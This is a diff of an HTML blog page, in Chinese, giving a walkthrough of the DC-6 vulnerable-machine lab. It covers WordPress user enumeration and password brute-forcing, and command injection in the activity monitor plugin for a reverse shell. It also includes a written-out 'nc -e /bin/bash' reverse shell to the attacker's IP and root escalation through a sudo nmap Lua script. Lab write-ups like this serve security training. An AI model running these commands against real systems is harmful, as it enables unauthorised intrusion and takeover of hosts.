@@ -11,8 +11,8 @@ VMware虚拟机
 kali  
 
 爆破拿后台密码根据目标靶机MAC地址得到目标IP：192.168.43.60，直接上nmap扫描。   
-
-开启了22和80两个端口号，并且需要指定域名解析才可以访问网">
+   
+开启了22和80两个端口号，并且需要指定域名解析才可以">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -374,27 +374,32 @@ kali
 <li>VMware虚拟机</li>
 <li>kali  </li>
 </ol>
-<h1 id="爆破拿后台密码"><a href="#爆破拿后台密码" class="headerlink" title="爆破拿后台密码"></a>爆破拿后台密码</h1><p>根据目标靶机MAC地址得到目标IP：192.168.43.60，直接上nmap扫描。   </p>
-<p><img src="https://img-blog.csdnimg.cn/20210527222623386.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDA1MzgxOA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<h1 id="爆破拿后台密码"><a href="#爆破拿后台密码" class="headerlink" title="爆破拿后台密码"></a><strong>爆破拿后台密码</strong></h1><p>根据目标靶机MAC地址得到目标IP：192.168.43.60，直接上nmap扫描。   </p>
+<p><img src="/2021/05/27/dc6/052702.png">   </p>
 <p>开启了22和80两个端口号，并且需要指定域名解析才可以访问网页，直接在<code>/etc/hosts</code>下写入<code>192.168.43.60 wordy</code>即可。</p>
-<p><img src="https://img-blog.csdnimg.cn/20210527222643270.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDA1MzgxOA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<p><img src="/2021/05/27/dc6/052703.png">    </p>
 <p>进入网站可以知道CMS为wordpress 5.1.1,直接wpscan扫描。   </p>
-<p><img src="https://img-blog.csdnimg.cn/20210527222652462.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDA1MzgxOA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<p><img src="/2021/05/27/dc6/052704.png">    </p>
 <p>扫描出5个用户，把五个用户写入user.txt中，用wpscan进行密码爆破，密码用kali自带的（路径为/usr/share/wordlists/rockyou.txt)(官网给出了提示可以少花点时间爆破：<code>cat /usr/share/wordlists/rockyou.txt |grep k01&gt;password.txt</code>)    </p>
-<p><img src="https://img-blog.csdnimg.cn/20210527222704645.png#pic_center" alt="在这里插入图片描述"></p>
-<p>爆破出一组密码mark/helpdesk01。    </p>
-<p>wordpress默认后台登陆路径为wp-admin。直接登陆。    </p>
-<h1 id="命令执行拿shell"><a href="#命令执行拿shell" class="headerlink" title="命令执行拿shell"></a>命令执行拿shell</h1><p><img src="https://img-blog.csdnimg.cn/20210527222713732.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDA1MzgxOA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>在后台找突破点，最终在activity monitor插件中找到lookup可以进行域名解析，尝试进行拼接命令执行。   </p>
-<p><img src="https://img-blog.csdnimg.cn/20210527222723128.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDA1MzgxOA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>   发现可以进行命令执行，但是长度有限制，所以直接抓包反弹shell。   </p>
-<p><img src="https://img-blog.csdnimg.cn/20210527222733870.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDA1MzgxOA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>    反弹成功。   </p>
-<h1 id="sudo切换用户"><a href="#sudo切换用户" class="headerlink" title="sudo切换用户"></a>sudo切换用户</h1><p><img src="https://img-blog.csdnimg.cn/2021052722274631.png#pic_center" alt="在这里插入图片描述"><br>   在/home/mark/stuff中发现graham密码，直接ssh连接。   </p>
-<p> <img src="https://img-blog.csdnimg.cn/20210527222755344.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDA1MzgxOA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>  发现/home/jens/backups.sh不需要密码即可执行。于是写入反弹shell命令<code>nc -e /bin/bash 192.168.43.173 6666</code>，执行backups.sh即可得到jens的shell。   </p>
-<h1 id="nmap脚本提权拿root权限"><a href="#nmap脚本提权拿root权限" class="headerlink" title="nmap脚本提权拿root权限"></a>nmap脚本提权拿root权限</h1><p>  <img src="https://img-blog.csdnimg.cn/20210527222806393.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDA1MzgxOA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>  发现nmap不需要密码即可root权限执行。nmap的–script参数可以执行脚本，脚本是用lua语言写的。   进入/tmp目录执行命令：</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">'os.execute("/bin/bash")'</span><span class="token operator">&gt;</span>getroot.sh
-<span class="token function">sudo</span> nmap <span class="token parameter variable">--script</span><span class="token operator">=</span>getroot.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
+<p><img src="/2021/05/27/dc6/052705.png">    </p>
+<p>爆破出一组密码mark/helpdesk01。<br>wordpress默认后台登陆路径为wp-admin。直接登陆。    </p>
+<h1 id="命令执行拿shell"><a href="#命令执行拿shell" class="headerlink" title="命令执行拿shell"></a><strong>命令执行拿shell</strong></h1><p><img src="/2021/05/27/dc6/052706.png">   </p>
+<p>在后台找突破点，最终在activity monitor插件中找到lookup可以进行域名解析，尝试进行拼接命令执行。   </p>
+<p><img src="/2021/05/27/dc6/052707.png">    </p>
+<p>发现可以进行命令执行，但是长度有限制，所以直接抓包反弹shell。   </p>
+<p><img src="/2021/05/27/dc6/052708.png">     </p>
+<p>反弹成功。   </p>
+<h1 id="sudo切换用户"><a href="#sudo切换用户" class="headerlink" title="sudo切换用户"></a><strong>sudo切换用户</strong></h1><p><img src="/2021/05/27/dc6/052709.png">    </p>
+<p>在/home/mark/stuff中发现graham密码，直接ssh连接。   </p>
+<p> <img src="/2021/05/27/dc6/052710.png">    </p>
+<p> 发现/home/jens/backups.sh不需要密码即可执行。于是写入反弹shell命令<code>nc -e /bin/bash 192.168.43.173 6666</code>，执行backups.sh即可得到jens的shell。   </p>
+<h1 id="nmap脚本提权拿root权限"><a href="#nmap脚本提权拿root权限" class="headerlink" title="nmap脚本提权拿root权限"></a><strong>nmap脚本提权拿root权限</strong></h1><p>  <img src="/2021/05/27/dc6/052711.png">     </p>
+<p>发现nmap不需要密码即可root权限执行。nmap的–script参数可以执行脚本，脚本是用lua语言写的。   </p>
+<p>进入/tmp目录执行命令：</p>
+<pre class="line-numbers language-none"><code class="language-none">echo 'os.execute("/bin/bash")'&gt;getroot.sh
+sudo nmap --script=getroot.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <p>提权成功   </p>
-<p><img src="https://img-blog.csdnimg.cn/20210527222817853.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDA1MzgxOA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<p><img src="/2021/05/27/dc6/052712.png"></p>
 <p>拿到flag。</p>
 
                 
